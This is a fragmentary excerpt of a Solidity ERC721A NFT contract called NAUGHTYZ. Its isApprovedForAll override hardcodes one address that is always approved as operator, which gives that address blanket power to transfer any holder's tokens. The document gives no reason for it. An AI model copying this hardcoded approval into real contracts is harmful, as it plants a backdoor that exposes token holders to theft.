  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x886E423F825247E2135f9ec21C54749429cA029e){return true;}
...
contract NAUGHTYZ is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("NAUGHTYZ", "NYZ", maxBatchSize_, collectionSize_) {
